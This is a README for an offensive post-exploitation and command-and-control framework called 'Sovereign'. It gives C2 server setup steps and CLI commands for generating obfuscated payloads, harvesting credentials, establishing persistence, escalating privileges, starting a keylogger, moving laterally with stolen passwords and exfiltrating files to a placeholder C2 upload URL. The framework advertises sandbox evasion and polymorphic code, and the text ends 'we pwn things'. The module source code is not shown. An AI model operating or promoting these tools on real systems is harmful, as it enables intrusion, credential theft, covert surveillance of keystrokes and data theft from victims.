# Sovereign Post-Exploitation Framework

This framework provides advanced post-exploitation capabilities with a focus on evasion and automation.

## Features

- **Enhanced Evasion Techniques**: Polymorphic code, sandbox detection, time-based evasion.
- **Advanced Post-Exploitation Modules**: Credential harvesting, persistence, 
    privilege escalation, reconnaissance, data exfiltration, keylogging, lateral movement.
- **Secure Communication**: Encrypted communication between agent and C2 server.
- **Modular Design**: Easily add new modules and functionalities.
- **Logging and Reporting**: Detailed logging and report generation.

## Usage

### Setting Up the C2 Server

1. **Create a Python virtual environment and activate it**:
    python -m venv venv
    source venv/bin/activate 
    On Windows: venv\Scripts\activate

2. **Install the required dependencies**:
    pip install -r c2_server/requirements.txt

3. **Run the C2 server**:
    python c2_server/c2_server.py

### Using the CLI (Under analysis)

The CLI provides various commands to interact with the framework.

#### List all registered agents:
    python cli/cli.py list_agents

#### Send a command to a specific agent:
    python cli/cli.py send_command --agent_id AGENT_ID --command "Your command here"

#### Generate an obfuscated payload for a specific platform:
    python cli/cli.py generate_payload --platform PLATFORM

#### Harvest credentials:
    python cli/cli.py harvest_credentials

#### Establish persistence:
    python cli/cli.py establish_persistence

#### Escalate privileges:
    python cli/cli.py escalate_privileges

#### Gather system information:
    python cli/cli.py gather_system_info

#### Exfiltrate data:
    python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload

#### Start keylogger:
    python cli/cli.py start_keylogger --log_file_path /path/to/log_file

#### Move laterally:
    python cli/cli.py move_laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD

### Example Commands (Under Analysis)

1. **Listing all registered agents**:
    python cli/cli.py list_agents

2. **Sending a command to a specific agent**:
    python cli/cli.py send_command --agent_id 1234-5678-9101-1121 --command "whoami"

3. **Generating a payload for Windows**:
    python cli/cli.py generate_payload --platform windows

4. **Harvesting credentials**:
    python cli/cli.py harvest_credentials

5. **Establishing persistence**:
    python cli/cli.py establish_persistence

6. **Escalating privileges**:
    python cli/cli.py escalate_privileges

7. **Gathering system information**:
    python cli/cli.py gather_system_info

8. **Exfiltrating data**:
    python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload

9. **Starting a keylogger**:
    python cli/cli.py start_keylogger --log_file_path /path/to/log_file

10. **Moving laterally**:
    python cli/cli.py move_laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD

### Logging and Reporting

Logs are stored in the c2_server.log file located in the c2_server directory. This file contains detailed information about agent activities and commands executed.

To generate a report from the logged data, run the following command:
    python c2_server/c2_server.py generate_report
This will create a report.txt file containing the logs. The report provides a comprehensive view of all interactions and events logged by the C2 server.

### Adding New Modules

To add new post-exploitation modules, create a new Python file in the c2_server/modules directory and implement the desired functionality. Update the CLI script to include commands for the new module.

### Key Generation and Conversion

#### RSA Key Generation
To generate a pair of RSA keys, you can use the OpenSSL toolkit. Run the following commands to generate a private key and a public key:

1. **Generate a private key:**
   openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048

2. **Extract the public key from the private key:**
   openssl rsa -pubout -in private_key.pem -out public_key.pem

#### AES Key Generation
To generate an AES key, you can use OpenSSL as well:

1. **Generate a 256-bit AES key:**
   openssl rand -base64 32 > aes_key.txt

#### Conversion to XML
For Sovereign-c2, you may need to convert these keys into XML format for MS Windows. Below are examples of how you might format the keys in XML.

### Secure Management of Keys
Ensure that keys are not stored in the repository. Instead, load them from secure storage at runtime. Below is an example of how you can load keys in a Python script:

import os
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

def load_private_key(path):
    with open(path, 'rb') as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
        )
    return private_key

def load_public_key(path):
    with open(path, 'rb') as key_file:
        public_key = serialization.load_pem_public_key(key_file.read())
    return public_key

def load_aes_key(path):
    import xml.etree.ElementTree as ET
    tree = ET.parse(path)
    root = tree.getroot()
    aes_key = root.find('value').text
    return aes_key

private_key_path = os.getenv('PRIVATE_KEY_PATH')
public_key_path = os.getenv('PUBLIC_KEY_PATH')
aes_key_path = os.getenv('AES_KEY_PATH')

private_key = load_private_key(private_key_path)
public_key = load_public_key(public_key_path)
aes_key = load_aes_key(aes_key_path)

print("Keys loaded successfully.")

### Setting Up Environment Variables
You can set up environment variables to point to the key file paths:

#### Example .env File
PRIVATE_KEY_PATH=/path/to/private_key.pem
PUBLIC_KEY_PATH=/path/to/public_key.pem
AES_KEY_PATH=/path/to/aes_key.xml

### Running the Project
To run the project, follow the instructions below:

1. **Clone the repository:**
   git clone https://github.com/4lph4-01/share.git
   cd Sovereign-C2

2. **Install dependencies:**
   pip install -r requirements.txt

3. **Run the CLI:**
   python cli/cli.py

4. **Set up the environment variables:**
   export $(cat .env | xargs)

### Contribution

Contributions to the Sovereign framework are welcome. Please submit a pull request with a detailed description of your changes.

### By the way, we pwn things.....
